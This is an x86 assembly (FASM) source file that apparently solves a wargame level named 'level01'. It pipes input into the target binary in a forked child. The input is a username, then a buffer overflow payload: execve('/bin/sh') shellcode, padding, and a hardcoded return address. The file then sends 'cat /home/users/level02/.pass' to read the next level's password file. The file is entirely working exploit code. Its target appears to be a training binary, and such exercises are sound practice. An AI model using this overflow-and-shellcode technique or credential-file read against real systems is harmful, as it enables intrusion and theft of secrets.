
format ELF executable $03
entry _start

struc string data*& {
    .: db data
    .length = ($ - .)
}

struc timespec {
    .tv_sec:    rq $01
    .tv_nsec:   rq $01
}

virtual at $00
    timespec timespec
    timespec.sizeof = $
end virtual

segment executable readable
_start:
    and esp, not $0F
    sub esp, $08
    mov eax, $2A
    mov ebx, esp
    int $80
    test eax, eax
    jnz .exit
    mov eax, $04
    mov ebx, dword [esp+$04]
    mov ecx, _username
    mov edx, _username.length
    int $80
    mov eax, $3F 
    mov ebx, dword [esp]
    xor ecx, ecx
    int $80
    mov eax, $02
    int $80
    test eax, eax
    jz .child
    sub esp, timespec.sizeof
    xor eax, eax
    mov edi, esp
    mov ecx, timespec.sizeof
    cld
    rep stosb   
    mov byte [esp+timespec.tv_sec], $01
    mov eax, $A2
    mov ebx, esp
    xor ecx, ecx
    int $80
    mov eax, $04
    mov ebx, dword [esp+timespec.sizeof+$04]
    mov ecx, _payload
    mov edx, _payload.length
    int $80
    mov eax, $A2
    mov ebx, esp
    xor ecx, ecx
    int $80
    mov eax, $04
    mov ebx, dword [esp+timespec.sizeof+$04]
    mov ecx, _command
    mov edx, _command.length
    int $80
    jmp .exit
.child:
    mov eax, $0B
    mov ebx, _program
    xor edx, edx
    push edx ebx
    mov ecx, esp
    int $80
.exit:
    mov eax, $01
    xor ebx, ebx
    int $80

segment readable
_username string "dat_wil", $0A
_command string "cat /home/users/level02/.pass", $0A
_program: db "/home/users/level01/level01", $00

_payload:
jmp short _init
_next:
mov ecx, esp
mov ebx, dword [esp]
xor byte [ebx+$07], $FF
xor eax, eax
mov al, $0B
int $80
_init:
xor edx, edx
push edx
call _next
db "/bin/sh", $FF
times ($50-($-_payload)) db '_'
dd $FFFFDE0C
db $0A

_payload.length = ($ - _payload)

